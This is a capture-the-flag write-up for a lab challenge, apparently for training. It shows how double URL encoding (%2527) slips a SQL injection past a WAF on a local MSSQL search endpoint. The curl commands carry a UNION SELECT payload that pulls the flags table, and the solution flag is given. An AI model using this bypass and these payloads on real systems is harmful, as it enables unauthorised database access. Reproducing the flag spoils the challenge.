# SQLi-050: MSSQL Double URL Encoding - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** Double URL Encoding `%2527` → `%27` → `'`  
**DBMS:** MSSQL  
**Flag:** `FLAG{d0ubl3_url_3nc0d1ng_byp4ss}`

---

## 🔍 Bước 1: DETECT

```bash
# Test với quote - bị block
curl "http://localhost:5050/search?q=test'"
# → "SQL injection attempt detected!"

# Test với %27 - vẫn bị block (Flask auto-decode)
curl "http://localhost:5050/search?q=test%27"
# → "SQL injection attempt detected!"
```

## 🎯 Bước 2: BYPASS

Server decode 2 lần. Double encode để bypass WAF:

```bash
# %2527 → Flask decode → %27 → WAF passes → Second decode → '
curl "http://localhost:5050/search?q=test%2527"
# → Bypass thành công!
```

### Encoding table

| Character | Single | Double |
|-----------|--------|--------|
| ' | %27 | %2527 |
| - | %2D | %252D |
| space | %20 | %2520 |

## 🔢 Bước 3: ENUMERATE

```bash
# Double encoded payload: ' UNION SELECT 1,2,3--
# ' = %2527, space = %2520, - = %252D
curl "http://localhost:5050/search?q=%2527%2520UNION%2520SELECT%25201,name,value%2520FROM%2520flags%252D%252D"
```

## 🏆 Bước 4: EXFILTRATE

```bash
curl "http://localhost:5050/search?q=%2527%2520UNION%2520SELECT%25201,name,value%2520FROM%2520flags%252D%252D"
```

🎉 **FLAG:** `FLAG{d0ubl3_url_3nc0d1ng_byp4ss}`

## ✅ Flag

```
FLAG{d0ubl3_url_3nc0d1ng_byp4ss}
```
